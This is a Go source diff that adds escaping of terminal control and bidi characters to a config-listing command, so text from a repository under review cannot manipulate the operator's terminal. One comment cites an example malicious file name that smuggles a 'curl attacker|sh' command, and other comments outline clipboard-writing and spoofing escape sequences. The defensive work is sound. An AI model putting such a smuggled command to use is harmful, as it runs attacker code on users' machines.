@@ -18,6 +18,8 @@ import (
 	"sync"
 	"syscall"
 	"time"
+	"unicode"
+	"unicode/utf8"
 
 	"github.com/dsaiko/fixpoint/internal/agent"
 	"github.com/dsaiko/fixpoint/internal/config"
@@ -253,12 +255,18 @@ func listConfigs(r *config.Resolver, projectRoot string, stdout, stderr io.Write
 		// `extends: defaults`. But they are marked, because an unmarked listing reads
 		// as "things you can run" and inviting someone to run a base is a wasted
 		// round trip through a validation error.
-		desc := c.Description
+		//
+		// Name, description, and path all come from a bundle directory -- the first
+		// one searched is <project>/config, inside the repository under review -- so
+		// every one is escaped before it reaches the operator's terminal. Listing is
+		// how you find out what a repository offers, and it runs before any trust
+		// gate, so merely looking must not let the repository drive the terminal.
+		desc := sanitizeField(c.Description)
 		if !c.Runnable {
 			desc = strings.TrimSpace(desc + "  (base — for `extends`, not runnable)")
 		}
-		fmt.Fprintf(stdout, "%-14s %s\n", c.Name, desc)
-		fmt.Fprintf(stdout, "%-14s %s\n", "", c.Path)
+		fmt.Fprintf(stdout, "%-14s %s\n", escapeTerminal(c.Name), desc)
+		fmt.Fprintf(stdout, "%-14s %s\n", "", escapeTerminal(c.Path))
 	}
 	return 0
 }
@@ -305,9 +313,49 @@ func listPorcelain(r *config.Resolver, stdout, stderr io.Writer) int {
 // shipping config/'$(curl attacker|sh)'.yaml gets nothing past this point.
 var bundleNameRE = regexp.MustCompile(`^[A-Za-z0-9._-]+$`)
 
-// sanitizeField flattens a value so it cannot break the tab-separated format.
+// sanitizeField flattens a value so it cannot break the tab-separated format,
+// then escapes what a terminal would interpret rather than print.
 func sanitizeField(s string) string {
-	return strings.Join(strings.Fields(strings.ReplaceAll(s, "\t", " ")), " ")
+	return escapeTerminal(strings.Join(strings.Fields(strings.ReplaceAll(s, "\t", " ")), " "))
+}
+
+// escapeTerminal renders repository-controlled text as something a terminal only
+// DISPLAYS. Collapsing whitespace is not enough: ESC, BEL, the C1 controls, and
+// the Unicode bidi/formatting characters all survive strings.Fields, and a
+// description is free text from a YAML file in the repository under review (the
+// project bundle is searched first, so it shadows the installed one).
+//
+// Both consumers print it before any trust gate applies. `fixpoint --list` writes
+// it to the operator's terminal, and the porcelain form is what zsh/fish show as
+// the completion description when TAB is pressed -- so an OSC 52 payload in a
+// description could write the operator's clipboard, cursor controls could redraw
+// the listing to misattribute a config, and a bidi override could make a name
+// read as something other than what would run. Escaping keeps the text visible
+// (and reviewable) instead of silently dropping it.
+func escapeTerminal(s string) string {
+	var b strings.Builder
+	b.Grow(len(s))
+	for i := 0; i < len(s); {
+		r, size := utf8.DecodeRuneInString(s[i:])
+		switch {
+		case r == utf8.RuneError && size == 1:
+			// Invalid encoding: a terminal can resynchronize mid-sequence and render
+			// bytes that were never a character, so show the byte itself.
+			fmt.Fprintf(&b, "\\x%02x", s[i])
+		case unicode.IsControl(r), unicode.Is(unicode.Cf, r):
+			// Cc (C0, DEL, C1 -- ESC and friends) plus Cf, which is where the bidi
+			// overrides and other invisible formatting controls live.
+			if r < 0x100 {
+				fmt.Fprintf(&b, "\\x%02x", r)
+			} else {
+				fmt.Fprintf(&b, "\\u%04x", r)
+			}
+		default:
+			b.WriteRune(r)
+		}
+		i += size
+	}
+	return b.String()
 }
 
 // allowProjectSuppliedPolicy gates bundle files that were resolved from inside the
